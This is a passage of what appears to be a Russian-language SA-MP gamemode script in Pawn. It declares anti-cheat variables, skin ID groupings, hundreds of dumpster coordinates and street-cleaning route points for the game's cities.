{931.907470,2395.395507,10.315099,0.0}, // 43
{905.552673,2315.603759,10.314900,0.0}, // 44
{904.695983,1961.435424,10.327899,0.0}, // 45
{918.574584,1851.130249,10.314700,0.0}, // 46
{999.389526,1851.077880,10.364100,0.0}, // 47
{1004.500427,1827.103271,10.314800,0.0}, // 48
{1042.588012,1811.496215,10.314999,0.0}, // 49
{1114.383056,1810.369262,10.314999,0.0}, // 50
{1194.379882,1811.557861,12.874799,0.0}, // 51
{1271.013916,1811.223266,10.766500,0.0}, // 52
{1289.036010,1851.788330,9.986599,0.0}, // 53
{1228.455444,1999.848022,6.377399,0.0}, // 54
{1230.277954,2252.721679,6.383200,0.0}, // 55
{1456.409301,2451.516845,6.377500,0.0}, // 56
{1727.739501,2470.310546,6.479199,0.0}, // 57
{1976.541381,2531.109130,6.438899,0.0}, // 58
{2141.761474,2578.098632,6.416399,0.0}, // 59
{2487.689697,2592.136718,4.694399,0.0}, // 60
{2657.761718,2454.841552,6.377600,0.0}, // 61
{2708.145507,2241.827392,6.386600,0.0}, // 62
{2707.802246,2025.912109,6.385399,0.0}, // 63
{2707.119140,1862.399780,6.377600,0.0}, // 64
{2706.483886,1711.140991,6.385099,0.0}, // 65
{2682.356445,1575.262817,6.596099,0.0}, // 66
{2637.139892,1490.802246,10.301600,0.0}, // 67
{2699.861572,1471.153686,13.171299,0.0}, // 68
{2774.394287,1471.742187,10.522600,0.0}, // 69
{2825.506103,1437.296142,10.353599,0.0}, // 70
{2824.653076,1353.411621,10.393099,0.0}, // 71
{2825.521728,1281.490112,10.408200,1.0} // 72
};
// =========================================

new AdCena = 500,AdSms = 15,AdZvon = 30;
//================ АНТИ-ЧИТ =============================
new Float:player__pos[3][MAX_PLAYERS];
static player__kill[MAX_PLAYERS char];
static player__timer[MAX_PLAYERS];
new Float:veh__pos[MAX_VEHICLES][4];
new tp__ignore_tick[MAX_PLAYERS];
new gun__ignore_tick[MAX_PLAYERS];
new car__ignore_tick[MAX_VEHICLES];
new cheatk[18];
new NameCheat[][] = {"Анти-Крашер (Пассажирским)",
"Анти-Крашер (Пассажирским)",
"Анти Dialog Hider",
"Анти Pizdarvanka",
"Анти TP в транспорт",
"Анти Fly",
"Анти AirBreake / TP (Персонаж)",
"Анти SpeedHack (Персонаж)",
"Анти AirBreake / TP (Транспорт)",
"Анти SpeedHack (Транспорт)",
"Анти Gun",
"Анти Ammo",
"Анти убийство вне стрима",
"Анти MiniGun",
"Анти Gun Крашер",
"Анти Gun Крашер 2",
"Анти Pro Aim"};
new Float:ServerHPVehicle[MAX_VEHICLES];
new Cheat,Text:CheatText[10],Cheater[10];



//skins
//new Text:ViborSP1[3];
//new PlayerText:ViborSP[MAX_PLAYERS];
new EvropM18[4] = {2,23,45,96};
new EvropM25[4] = {3,26,60,72};
new EvropM35[4] = {29,33,34,59};
new EvropM50[4] = {1,32,37,62};

new EvropJ18[2] = {192,152};
new EvropJ35[2] = {201,157};
new EvropJ50[4] = {231,232,197,196};

new NegrM18[3] = {18,21,143};
new NegrM25[4] = {19,22,67,176};
new NegrM35[4] = {14,24,25,28};
new NegrM50[4] = {15,36,142,156};
new NegrJ18[2] = {195,65};
new NegrJ25[2] = {190,64};
new NegrJ35[2] = {243,245};
new AziatM18[2] = {170,59};
new AziatM25[2] = {250,60};
new AziatM35[2] = {186,229};
new AziatM50[2] = {49,57};
new LationM18[3] = {6,184,185};
new LationM25[4] = {20,30,47,242};
new LationM35[4] = {43,48,58,119};
new LationM50[2] = {44,236};
new LationJ18[2] = {226,131};
new LationJ25[2] = {298,56};
new LationJ50[2] = {89,54};
//
new pdlift[7];

new ashlift[2];
new hoslift[2];
new fbilift[4];
//================ МУСОРКИ ========================
static const Float:MusorPos[329][4] =
{
    {1464.30004883,-725.00000000,92.50000000,110.00000000}, //object(cj_dumpster2) (1)
	{1514.50000000,-776.00000000,79.69999695,126.00000000}, //object(cj_dumpster2) (2)
	{1523.40002441,-794.79998779,74.09999847,87.99670410}, //object(cj_dumpster2) (3)
	{1522.69995117,-837.29998779,67.00000000,87.99499512}, //object(cj_dumpster2) (4)
	{1459.30004883,-888.09997559,55.29999924,337.99499512}, //object(cj_dumpster2) (5)
	{1415.69995117,-930.59997559,35.70000076,175.99438477}, //object(cj_dumpster2) (6)
	{1444.40002441,-934.40002441,36.09999847,175.98999023}, //object(cj_dumpster2) (7)
	{1273.50000000,-914.29998779,42.00000000,185.98999023}, //object(cj_dumpster2) (8)
	{1236.59997559,-920.79998779,42.70000076,189.98754883}, //object(cj_dumpster2) (9)
	{1179.19995117,-932.09997559,43.00000000,189.98657227}, //object(cj_dumpster2) (10)
	{1133.69995117,-1033.09997559,31.70000076,179.98657227}, //object(cj_dumpster2) (11)
	{1116.69995117,-1033.19995117,31.70000076,179.98352051}, //object(cj_dumpster2) (12)
	{1091.90002441,-1071.90002441,27.89999962,89.98352051}, //object(cj_dumpster2) (13)
	{1091.90002441,-1097.69995117,24.89999962,89.97802734}, //object(cj_dumpster2) (14)
	{1172.00000000,-1104.69995117,24.70000076,89.97802734}, //object(cj_dumpster2) (15)
	{1171.90002441,-1070.80004883,28.10000038,89.97802734}, //object(cj_dumpster2) (16)
	{1199.50000000,-1029.09997559,31.79999924,179.97802734}, //object(cj_dumpster2) (17)
	{1237.30004883,-1028.50000000,31.79999924,179.97802734}, //object(cj_dumpster2) (18)
	{820.79998779,-1411.90002441,13.30000019,359.97802734}, //object(cj_dumpster2) (19)
	{848.90002441,-1412.09997559,13.19999981,359.97253418}, //object(cj_dumpster2) (20)
	{883.79998779,-1412.30004883,12.89999962,359.97253418}, //object(cj_dumpster2) (21)
	{908.59997559,-1467.90002441,13.39999962,269.97253418}, //object(cj_dumpster2) (22)
	{908.29998779,-1509.59997559,13.39999962,269.96704102}, //object(cj_dumpster2) (23)
	{858.09997559,-1523.90002441,13.39999962,269.96704102}, //object(cj_dumpster2) (24)
	{801.00000000,-1689.40002441,13.39999962,269.96704102}, //object(cj_dumpster2) (25)
	{801.29998779,-1703.59997559,13.39999962,269.96704102}, //object(cj_dumpster2) (26)
	{801.09997559,-1724.00000000,13.39999962,269.96704102}, //object(cj_dumpster2) (27)
	{796.00000000,-1759.90002441,13.30000019,179.96704102}, //object(cj_dumpster2) (28)
	{764.29998779,-1744.19995117,12.10000038,89.96704102}, //object(cj_dumpster2) (29)
	{763.40002441,-1690.69995117,4.30000019,89.96154785}, //object(cj_dumpster2) (30)
	{788.09997559,-1665.59997559,13.30000019,179.96154785}, //object(cj_dumpster2) (31)
	{648.29998779,-1644.30004883,14.80000019,89.95605469}, //object(cj_dumpster2) (32)
	{647.59997559,-1614.40002441,15.00000000,89.95056152}, //object(cj_dumpster2) (33)
	{196.10000610,-1389.90002441,48.00000000,40.00000000}, //object(cj_dumpster2) (35)
	{255.50000000,-1337.59997559,52.70000076,39.99572754}, //object(cj_dumpster2) (36)
	{289.29998779,-1314.19995117,53.90000153,39.99572754}, //object(cj_dumpster2) (37)
	{347.29998779,-1280.59997559,53.79999924,29.99572754}, //object(cj_dumpster2) (38)
	{409.60000610,-1252.90002441,51.59999847,29.99267578}, //object(cj_dumpster2) (39)
	{563.00000000,-1196.00000000,44.59999847,20.00000000}, //object(cj_dumpster2) (41)
	{634.90002441,-1111.09997559,46.50000000,39.99511719}, //object(cj_dumpster2) (42)
	{684.40002441,-1061.69995117,49.40000153,59.99023438}, //object(cj_dumpster2) (43)
	{725.79998779,-985.70001221,52.70000076,59.98535156}, //object(cj_dumpster2) (44)
	{312.60000610,-1196.09997559,76.00000000,219.98535156}, //object(cj_dumpster2) (45)
	{253.89999390,-1239.09997559,72.30000305,210.98474121}, //object(cj_dumpster2) (46)
	{220.69999695,-1267.30004883,65.19999695,239.98474121}, //object(cj_dumpster2) (47)
	{339.50000000,-1197.19995117,76.30000305,39.97985840}, //object(cj_dumpster2) (48)
	{402.70001221,-1168.40002441,78.30000305,149.97924805}, //object(cj_dumpster2) (49)
	{579.20001221,-1127.40002441,49.20000076,199.97436523}, //object(cj_dumpster2) (50)
	{632.59997559,-1093.40002441,46.79999924,213.97314453}, //object(cj_dumpster2) (51)
	{668.00000000,-1057.00000000,49.29999924,233.96972656}, //object(cj_dumpster2) (52)
	{691.40002441,-1014.79998779,51.70000076,243.96484375}, //object(cj_dumpster2) (53)
	{828.70001221,-868.50000000,68.59999847,201.96240234}, //object(cj_dumpster2) (54)
	{872.20001221,-855.09997559,77.30000305,201.96166992}, //object(cj_dumpster2) (55)
	{921.09997559,-832.20001221,93.59999847,201.96166992}, //object(cj_dumpster2) (56)
	{831.59997559,-880.29998779,68.19999695,331.96166992}, //object(cj_dumpster2) (57)
	{924.59997559,-842.20001221,93.59999847,21.95739746}, //object(cj_dumpster2) (58)
	{976.59997559,-814.29998779,97.59999847,21.95617676}, //object(cj_dumpster2) (59)
	{1030.19995117,-791.50000000,102.80000305,21.95617676}, //object(cj_dumpster2) (60)
	{1081.80004883,-777.50000000,107.69999695,1.95617676}, //object(cj_dumpster2) (61)
	{1077.90002441,-765.50000000,107.59999847,189.95556641}, //object(cj_dumpster2) (62)
	{1063.90002441,-623.79998779,115.69999695,9.95361328}, //object(cj_dumpster2) (63)
	{1082.59997559,-626.00000000,113.00000000,9.94812012}, //object(cj_dumpster2) (64)
	{998.20001221,-644.50000000,121.50000000,29.94812012}, //object(cj_dumpster2) (65)
	{910.70001221,-681.79998779,116.19999695,229.94323730}, //object(cj_dumpster2) (66)
	{949.00000000,-696.29998779,121.90000153,29.93835449}, //object(cj_dumpster2) (67)
	{898.40002441,-769.40002441,97.09999847,9.93774414},
	{832.79998779,-798.29998779,73.09999847,9.93713379},
	{794.29998779,-807.40002441,65.90000153,9.93713379},
	{897.29998779,-711.79998779,109.59999847,260.00000000},
	{239.65, -95.84, 1.58,   91.32},
	{239.74, -118.88, 1.58,   91.32},
	{325.93, -121.10, 1.58,   271.10},
	{325.89, -95.86, 1.58,   271.10},
	{265.45, -64.92, 1.58,   179.96},
	{239.69, -26.58, 1.58,   89.71},
	{736.57, -523.21, 16.21,   179.02},
	{779.00, -523.25, 16.21,   179.02},
	{813.12, -523.26, 16.21,   179.96},
	{738.81, -536.99, 16.21,   1.11},
	{777.70, -536.99, 16.21,   1.94},
	{2350.80, 188.64, 26.22,   91.00},
	{2350.75, 134.63, 26.22,   91.00},
	{2350.71, 105.32, 26.22,   91.00},
	{2400.71, 22.17, 26.22,   91.00},
	{2470.83, 66.71, 26.22,   91.00},
	{2540.73, 76.81, 26.22,   91.00},
	{2540.66, 5.85, 26.22,   91.00},
	{2498.47, 104.91, 26.22,   359.23},
	{2431.72, -35.15, 26.22,   359.23},
	{2378.88, -35.13, 26.22,   359.23},
	{2313.62, -105.08, 26.22,   359.23},
	{2259.08, -105.03, 26.22,   359.23},
	{2443.21, 48.53, 26.22,   178.94},
	{2421.21, 48.45, 26.22,   178.94},
	{2383.01, 98.79, 26.22,   178.94},
	{2475.12, 118.51, 26.22,   178.94},
	{2512.74, 118.49, 26.22,   178.94},
	{2509.32, -15.08, 26.22,   359.23},
	{1903.05, -1049.86, 23.89,   358.00},
	{1953.33, -1054.39, 24.10,   350.34},
	{2026.01, -1060.01, 24.55,   157.00},
	{2065.52, -1077.81, 24.76,   157.00},
	{2105.70, -1095.61, 25.04,   155.39},
	{2153.94, -1088.39, 25.03,   155.00},
	{2023.31, -1129.72, 24.72,   179.00},
	{1992.58, -1129.78, 25.64,   179.00},
	{1944.96, -1129.73, 25.64,   181.21},
	{1904.3395, -1129.8004, 24.6400,   181.21},
	{2077.97, -1127.56, 23.92,   90.31},
	{2077.91, -1163.08, 23.92,   89.89},
	{2089.25, -1294.75, 23.89,   179.96},
	{2128.76, -1294.73, 23.89,   179.96},
	{2191.03, -1294.59, 23.89,   179.96},
	{2247.32, -1294.73, 23.89,   179.96},
	{2094.57, -1226.91, 23.89,   360.00},
	{2154.48, -1226.86, 23.89,   360.00},
	{2205.32, -1226.86, 23.89,   360.00},
	{2253.96, -1226.92, 23.89,   360.00},
	{2151.10, -1306.91, 23.89,   360.00},
	{2107.25, -1306.97, 23.89,   360.00},
	{2227.45, -1390.26, 23.89,   360.00},
	{2263.73, -1390.36, 23.89,   360.00},
	{2206.45, -1403.90, 23.89,   269.38},
	{2147.68, -1378.29, 23.89,   179.96},
	{2135.47, -1426.23, 23.89,   90.49},
	{2135.48, -1470.86, 23.89,   90.49},
	{2186.56, -1378.25, 23.89,   179.96},
	{2206.53, -1488.03, 23.89,   269.38},
	{1855.69, -1926.20, 13.44,   180.00},
	{1903.58, -1926.18, 13.44,   180.00},
	{1944.11, -1926.27, 13.44,   180.00},
	{1995.55, -1718.13, 13.50,   270.55},
	{1995.59, -1647.34, 13.50,   270.55},
	{2074.87, -1728.97, 13.50,   270.55},
	{2074.88, -1706.43, 13.50,   270.55},
	{2074.80, -1649.38, 13.50,   270.55},
	{2074.79, -1624.52, 13.50,   270.55},
	{2008.48, -1635.21, 13.50,   90.28},
	{2008.48, -1721.76, 13.50,   90.28},
	{2314.05, -1726.07, 13.42,   179.55},
	{2386.48, -1725.76, 13.42,   179.55},
	{2389.23, -1653.06, 13.42,   179.55},
	{2366.88, -1652.96, 13.42,   179.55},
	{2285.65, -1652.69, 14.98,   182.25},


	//lv

	{2642.57, 767.02, 10.84,   0.59},
	{2618.29, 767.06, 10.84,   0.59},
	{2565.09, 767.02, 10.84,   0.59},
	{2529.38, 766.97, 10.84,   0.59},
	{2551.88, 699.42, 10.87,   180.32},
	{2398.52, 706.79, 10.84,   0.59},
	{2369.56, 706.98, 10.84,   0.59},
	{2329.12, 706.88, 10.84,   0.59},
	{2258.87, 706.79, 10.84,   0.59},
	{2203.37, 706.77, 10.84,   0.59},
	{2122.67, 666.96, 10.84,   0.59},
	{2075.39, 667.23, 10.84,   0.59},
	{2030.08, 666.90, 10.84,   0.59},
	{2028.57, 746.85, 10.84,   0.59},
	{2072.46, 746.99, 10.84,   0.59},
	{2114.22, 747.03, 10.84,   0.59},
	{2394.46, 719.40, 10.87,   180.32},
	{2433.57, 724.43, 10.87,   90.27},
	{2433.68, 679.99, 10.87,   90.27},
	{2343.90, 719.52, 10.87,   180.32},
	{2393.25, 639.58, 10.87,   180.32},
	{2341.52, 639.45, 10.87,   180.32},
	{2252.82, 639.42, 10.87,   180.32},
	{2203.64, 639.33, 10.87,   180.32},
	{2201.28, 719.26, 10.87,   180.32},
	{2120.93, 759.50, 10.87,   180.32},
	{2070.09, 759.47, 10.87,   180.32},
	{2023.90, 759.45, 10.87,   180.32},
	{2034.44, 679.66, 10.87,   180.32},
	{2095.44, 679.43, 10.87,   180.32},
	{2153.85, 764.59, 10.87,   90.27},
	{1861.23, 708.06, 10.87,   270.72},
	{1303.57, 2034.20, 10.63,   89.38},
	{1303.69, 2001.51, 10.63,   89.38},
	{1394.07, 1990.95, 10.63,   89.38},
	{1393.90, 2024.64, 10.63,   89.38},
	{1393.58, 1926.95, 10.63,   89.38},
	{1533.87, 2074.94, 10.63,   89.38},
	{1533.83, 2114.63, 10.63,   89.38},
	{1624.99, 2154.48, 10.63,   89.38},
	{1624.71, 2096.19, 10.63,   89.38},
	{1624.71, 2045.27, 10.63,   89.38},
	{1381.06, 1994.91, 10.63,   271.13},
	{1380.93, 2035.42, 10.63,   269.63},
	{1612.15, 2035.01, 10.63,   269.63},
	{1611.98, 2065.01, 10.63,   269.63},
	{1612.14, 2115.02, 10.63,   269.63},
	{1611.95, 2148.89, 10.63,   269.63},
	{1699.60, 2121.21, 10.63,   269.63},
	{1700.27, 2075.47, 10.63,   269.63},
	{1700.60, 2040.05, 10.63,   269.63},
	{1700.92, 1985.08, 10.63,   269.63},
	{1560.99, 2011.05, 10.63,   270.30},
	{1561.03, 1989.74, 10.63,   270.30},
	{1380.92, 1895.00, 10.63,   271.13},
	{1480.91, 1892.00, 10.63,   271.13},
	{1480.97, 1937.24, 10.63,   271.13},
	{1300.29, 2547.20, 10.88,   90.08},
	{1391.93, 2551.38, 10.87,   90.08},
	{1484.43, 2532.94, 10.87,   90.08},
	{1594.32, 2663.57, 10.87,   90.08},
	{1914.71, 2753.74, 10.87,   90.08},
	{1953.12, 2748.35, 10.87,   180.72},
	{1989.09, 2748.43, 10.87,   180.72},
	{2023.63, 2748.47, 10.87,   180.72},
	{2064.93, 2748.47, 10.87,   180.72},
	{2053.51, 2650.59, 10.87,   180.72},
	{2011.46, 2650.65, 10.87,   180.72},
	{1985.99, 2650.74, 10.87,   180.72},
	{1943.95, 2650.69, 10.87,   180.72},
	{1659.71, 2739.69, 10.87,   180.72},
	{1623.39, 2740.00, 10.87,   180.72},
	{1578.96, 2739.51, 10.87,   180.72},
	{1564.48, 2827.96, 10.87,   180.72},
	{1606.19, 2828.01, 10.87,   180.72},
	{1669.44, 2828.21, 10.87,   180.72},
	{1615.70, 2596.47, 10.87,   180.72},
	{1653.03, 2596.10, 10.87,   180.72},
	{1551.35, 2596.23, 10.87,   180.72},
	{1499.03, 2596.12, 10.87,   180.72},
	{1335.61, 2596.18, 10.87,   180.72},
	{1306.87, 2596.19, 10.87,   180.72},
	{1281.20, 2596.15, 10.87,   180.72},
	{1240.80, 2601.34, 10.87,   269.24},
	{1285.23, 2561.32, 10.87,   269.24},
	{1285.18, 2537.78, 10.87,   269.51},
	{1379.27, 2536.53, 10.87,   269.51},
	{1471.01, 2534.72, 10.87,   269.51},
	{1332.01, 2583.56, 10.87,   360.00},
	{1355.20, 2583.58, 10.87,   360.00},
	{1421.89, 2583.46, 10.87,   360.00},
	{1446.24, 2583.39, 10.87,   360.00},
	{1488.70, 2582.01, 10.878,   360.00},
	{1510.08, 2581.70, 10.87,   360.00},
	{1529.74, 2582.02, 10.87,   360.00},
	{1582.53, 2582.17, 10.87,   360.00},
	{1650.35, 2582.03, 10.87,   360.00},
	{1557.09, 2727.03, 10.87,   360.00},
	{1595.83, 2726.94, 10.87,   360.00},
	{1628.76, 2726.99, 10.87,   360.00},
	{1668.93, 2727.10, 10.87,   360.00},
	{1699.00, 2706.95, 10.87,   360.00},
	{1720.95, 2707.02, 10.87,   360.00},
	{1001.12, 2025.14, 10.69,   269.86},
	{1001.23, 1976.18, 10.69,   269.86},
	{1001.18, 1924.32, 10.69,   269.86},
	{1001.16, 1878.22, 10.69,   269.86},
	{1101.15, 1974.30, 10.69,   269.86},
	{1101.13, 2024.37, 10.69,   269.86},
	{901.13, 2051.30, 10.69,   269.86},
	{901.12, 1984.46, 10.69,   269.86},
	{913.65, 2031.43, 10.69,   90.34},
	{913.78, 1932.05, 10.69,   90.34},
	{1013.64, 1929.09, 10.69,   90.34},
	{1013.67, 1876.48, 10.69,   90.34},
	{1013.65, 1848.01, 10.69,  90.34},
	{1013.70, 1976.77, 10.69,   90.34},
	{1013.65, 2029.22, 10.69,   90.34},

	//sf
	{-2800.30004883,-187.19999695,7.00000000,270.00000000}, //object(cj_dumpster2) (73)
	{-2800.30004883,-162.69999695,7.00000000,270.00000000}, //object(cj_dumpster2) (74)
	{-2800.19995117,-137.00000000,7.00000000,270.00000000}, //object(cj_dumpster2) (75)
	{-2800.89990234,-124.40000153,7.00000000,270.00000000}, //object(cj_dumpster2) (76)
	{-2800.00000000,-97.30000305,7.00000000,270.00000000}, //object(cj_dumpster2) (78)
	{-2800.19995117,-86.09999847,7.00000000,270.00000000}, //object(cj_dumpster2) (79)
	{-2799.80004883,-44.40000153,7.00000000,270.00000000}, //object(cj_dumpster2) (80)
	{-2800.19995117,-22.89999962,7.00000000,270.00000000}, //object(cj_dumpster2) (81)
	{-2800.60009766,3.59999990,7.00000000,270.00000000}, //object(cj_dumpster2) (82)
	{-2800.80004883,24.10000038,7.00000000,270.00000000}, //object(cj_dumpster2) (83)
	{-2800.00000000,76.00000000,7.00000000,270.00000000}, //object(cj_dumpster2) (84)
	{-2799.89990234,93.90000153,7.00000000,270.00000000}, //object(cj_dumpster2) (85)
	{-2800.00000000,115.19999695,7.00000000,270.00000000}, //object(cj_dumpster2) (86)
	{-2800.30004883,138.89999390,7.00000000,270.00000000}, //object(cj_dumpster2) (87)
	{-2800.10009766,177.69999695,7.00000000,270.00000000}, //object(cj_dumpster2) (88)
	{-2800.60009766,202.60000610,7.00000000,270.00000000}, //object(cj_dumpster2) (89)
	{-2800.19995117,220.60000610,7.00000000,270.00000000}, //object(cj_dumpster2) (90)
	{-2714.80004883,-176.30000305,4.09999990,90.00000000}, //object(cj_dumpster2) (91)
	{-2715.10009766,-149.60000610,4.09999990,90.00000000}, //object(cj_dumpster2) (92)
	{-2714.89990234,-130.00000000,4.09999990,90.00000000}, //object(cj_dumpster2) (93)
	{-2715.00000000,-111.69999695,4.09999990,90.00000000}, //object(cj_dumpster2) (94)
	{-2715.00000000,-86.59999847,4.09999990,90.00000000}, //object(cj_dumpster2) (95)
	{-2714.89990234,-54.50000000,4.09999990,90.00000000}, //object(cj_dumpster2) (96)
	{-2714.80004883,-37.09999847,4.09999990,90.00000000}, //object(cj_dumpster2) (97)
	{-2715.10009766,-16.50000000,4.09999990,90.00000000}, //object(cj_dumpster2) (98)
	{-2714.80004883,3.40000010,4.09999990,90.00000000}, //object(cj_dumpster2) (99)
	{-2714.69995117,23.60000038,4.09999990,90.00000000}, //object(cj_dumpster2) (100)
	{-2695.39990234,5.30000019,4.09999990,270.00000000}, //object(cj_dumpster2) (101)
	{-2695.80004883,-16.39999962,4.09999990,270.00000000}, //object(cj_dumpster2) (102)
	{-2697.80004883,-92.50000000,4.09999990,270.00000000}, //object(cj_dumpster2) (103)
	{-2697.60009766,-111.80000305,4.09999990,270.00000000}, //object(cj_dumpster2) (104)
	{-2697.69995117,-130.50000000,4.09999990,270.00000000}, //object(cj_dumpster2) (105)
	{-2698.10009766,-150.69999695,4.09999990,270.00000000}, //object(cj_dumpster2) (106)
	{-2697.50000000,-168.89999390,4.09999990,270.00000000}, //object(cj_dumpster2) (107)
	{-2697.19995117,-178.60000610,4.09999990,270.00000000}, //object(cj_dumpster2) (108)
	{-2697.60009766,-194.39999390,4.09999990,270.00000000}, //object(cj_dumpster2) (109)
	{-2612.80004883,-194.50000000,4.09999990,90.00000000}, //object(cj_dumpster2) (110)
	{-2612.89990234,-171.19999695,4.09999990,90.00000000}, //object(cj_dumpster2) (111)
	{-2612.89990234,-152.10000610,4.09999990,90.00000000}, //object(cj_dumpster2) (112)
	{-2612.80004883,-129.39999390,4.09999990,90.00000000}, //object(cj_dumpster2) (113)
	{-2612.69995117,-114.19999695,4.09999990,90.00000000}, //object(cj_dumpster2) (114)
	{-2612.50000000,-93.50000000,4.09999990,90.00000000}, //object(cj_dumpster2) (115)
	{-2510.19995117,-187.00000000,25.39999962,90.00000000}, //object(cj_dumpster2) (116)
	{-2509.89990234,-164.89999390,25.39999962,90.00000000}, //object(cj_dumpster2) (117)
	{-2509.80004883,-148.10000610,25.39999962,90.00000000}, //object(cj_dumpster2) (118)
	{-2595.10009766,-116.30000305,4.09999990,270.00000000}, //object(cj_dumpster2) (119)
	{-2596.00000000,-88.40000153,4.09999990,270.00000000}, //object(cj_dumpster2) (120)
	{-2868.19995117,802.70001221,37.00000000,70.00000000}, //object(cj_dumpster2) (122)
	{-2874.50000000,751.29998779,31.29999924,99.99938965}, //object(cj_dumpster2) (123)
	{-2865.39990234,723.90002441,28.89999962,119.99752808}, //object(cj_dumpster2) (124)
	{-2856.69995117,711.40002441,26.79999924,129.99267578}, //object(cj_dumpster2) (125)
	{-2839.69995117,686.59997559,21.50000000,129.99023438}, //object(cj_dumpster2) (126)
	{-2833.00000000,861.20001221,43.90000153,89.99023438}, //object(cj_dumpster2) (127)
	{-2832.30004883,890.50000000,43.90000153,89.98901367}, //object(cj_dumpster2) (128)
	{-2833.80004883,931.20001221,43.90000153,89.98901367}, //object(cj_dumpster2) (129)
	{-2832.30004883,908.79998779,43.90000153,89.98901367}, //object(cj_dumpster2) (130)
	{-2837.19995117,948.20001221,43.90000153,97.98901367}, //object(cj_dumpster2) (131)
	{-2852.60009766,976.09997559,43.09999847,127.98706055}, //object(cj_dumpster2) (132)
	{-2880.00000000,1008.70001221,37.90000153,107.98526001}, //object(cj_dumpster2) (133)
	{-2887.69995117,1028.69995117,35.29999924,107.98461914}, //object(cj_dumpster2) (134)
	{-2890.69995117,1059.59997559,32.09999847,85.98461914}, //object(cj_dumpster2) (135)
	{-2890.69995117,1082.80004883,30.29999924,85.98449707}, //object(cj_dumpster2) (136)
	{-2890.50000000,1108.40002441,26.50000000,85.98449707}, //object(cj_dumpster2) (137)
	{-2648.60009766,166.60000610,4.09999990,0.00000000}, //object(cj_dumpster2) (140)
	{-2621.10009766,166.69999695,4.09999990,0.00000000}, //object(cj_dumpster2) (141)
	{-2697.19995117,92.90000153,4.09999990,270.00000000}, //object(cj_dumpster2) (142)
	{-2697.50000000,118.59999847,4.09999990,270.00000000} //object(cj_dumpster2) (143)
};
#define NONE_3D_TEXT (Text3D:-1)
new MusorCount[sizeof(MusorPos)] = {100, ...};
new Text3D:MusorText[sizeof(MusorPos)] = {NONE_3D_TEXT, ...};
new MusorObject[sizeof(MusorPos)] = {-1, ...};
// ===================================================================

///
//================ МАРШТУРЫ ЧИСТКИ УЛИЦ ========================
static const Float:WashLosSantos[70][4] = {
{74.654502,-1545.091064,5.016699,259.094207},
{118.716300,-1558.820068,8.037099,243.546798},
{169.421401,-1544.205078,11.942299,326.441986},
{200.402603,-1498.298950,12.404899,325.983886},
{323.854888,-1401.347900,13.782600,292.632110},
{433.104095,-1339.470092,14.619600,301.540893},
{492.845489,-1295.333984,15.251600,307.497497},
{565.802124,-1240.834960,16.912300,302.086212},
{617.896423,-1220.924194,17.790899,287.102691},
{624.399475,-1264.821044,16.763500,184.500000},
{625.995117,-1357.205322,13.083800,180.943893},
{625.336425,-1407.549438,13.014300,179.645095},
{680.798889,-1407.880126,13.093000,270.118408},
{745.718627,-1407.751464,13.051799,270.117004},
{827.863586,-1408.225952,12.941900,269.762786},
{913.585388,-1408.072875,12.906800,270.559387},
{1038.824462,-1408.604248,12.891400,269.502899},
{1156.757568,-1408.691772,13.151100,269.266387},
{1277.666259,-1407.712524,12.747599,270.285308},
{1338.569946,-1407.289794,13.022999,273.200988},
{1396.018798,-1418.173950,13.066800,200.194702},
{1430.697021,-1443.221801,13.064299,269.569488},
{1450.234008,-1443.368774,13.068200,269.568695},
{1442.498901,-1503.839233,13.062100,165.036300},
{1427.703857,-1601.380981,13.065199,180.399398},
{1426.957275,-1705.601806,13.064399,180.376403},
{1454.220947,-1734.874267,13.064299,271.330902},
{1507.031494,-1735.170166,13.064399,269.773986},
{1576.215087,-1734.574584,13.065400,270.147705},
{1668.198608,-1734.339233,13.064399,270.148712},
{1746.639770,-1734.138305,13.071999,270.147491},
{1822.742675,-1735.018920,13.064299,272.266296},
{1824.057861,-1673.441040,13.064399,357.214385},
{1834.197875,-1547.667236,13.063099,345.407501},
{1852.675292,-1464.578125,13.080100,357.153015},
{1852.514038,-1350.166381,13.071999,0.312299},
{1853.821533,-1266.779907,13.073399,0.060400},
{1853.739990,-1190.526855,23.289400,0.059300},
{1807.629272,-1174.492187,23.319900,73.741897},
{1750.656127,-1161.097045,23.314800,78.432601},
{1682.682250,-1157.976806,23.337799,89.318199},
{1597.157958,-1158.523925,23.588399,90.014503},
{1520.897705,-1158.539428,23.587799,90.013099},
{1441.630249,-1157.602539,23.337799,88.161697},
{1369.772460,-1140.307006,23.337799,90.328697},
{1297.552734,-1138.544677,23.337900,89.944602},
{1197.597412,-1138.580566,23.396099,89.304100},
{1079.389526,-1138.755249,23.337900,90.622398},
{988.346130,-1138.115600,23.465700,89.571197},
{904.902099,-1138.851440,23.412700,90.407501},
{813.339477,-1139.510253,23.517200,90.401802},
{795.738525,-1165.716186,22.924800,181.832000},
{795.183227,-1248.875488,13.263699,180.240707},
{795.477416,-1312.285522,13.064399,181.205993},
{794.990722,-1379.116821,13.135000,179.421203},
{794.267822,-1448.608642,13.068400,179.424896},
{778.845825,-1528.543701,13.063599,164.591705},
{766.993286,-1582.687011,13.064299,167.773895},
{684.975585,-1583.119384,13.685500,88.982101},
{628.124084,-1650.270507,15.451399,182.129302},
{621.286071,-1716.062133,13.680000,172.040802},
{552.131286,-1717.112548,12.719300,81.544502},
{451.198394,-1702.742187,10.314200,82.071403},
{365.410491,-1699.732788,6.487599,89.444503},
{260.380310,-1674.543090,8.840700,65.519203},
{210.022094,-1624.023315,13.892000,38.154300},
{154.027694,-1559.803955,10.729999,44.968700},
{74.482902,-1525.399169,4.553699,83.245498},
{18.959499,-1519.187622,3.838000,84.513000},
{-28.561000,-1513.687255,1.501799,83.847503}
};
static const Float:WashLasVenturas[70][4] = {
{930.595092,725.778320,10.386699,290.651885},
{1057.533935,780.799316,10.388899,298.974609},
{1177.721557,820.388488,9.444700,280.752288},
{1311.366821,830.758117,7.121500,271.826110},
{1547.435424,832.562072,6.493000,270.354614},
{1762.839477,832.615600,9.878600,269.571289},
{1806.458129,895.263671,9.300900,358.454315},
{1807.693603,1081.374145,6.415900,359.004608},
{1806.040039,1253.666381,6.415999,0.505599},
{1806.331298,1383.064941,6.419700,359.740509},
{1806.959838,1532.843017,6.419700,359.771209},
{1831.826538,1614.595092,6.783400,332.627105},
{1876.964721,1709.305786,10.638600,356.719604},
{1955.061767,1711.123168,10.353500,269.329589},
{2051.836425,1710.684448,10.359000,269.919891},
{2084.833984,1736.336059,10.353400,329.417388},
{2133.955566,1834.352783,10.353500,334.725891},
{2148.924316,1947.547241,10.361200,357.859008},
{2149.239013,2051.891357,10.362400,359.458312},
{2150.210693,2154.614013,10.353500,359.458404},
{2153.362548,2251.404541,10.353400,352.179412},
{2204.880859,2281.443847,10.353400,269.667388},
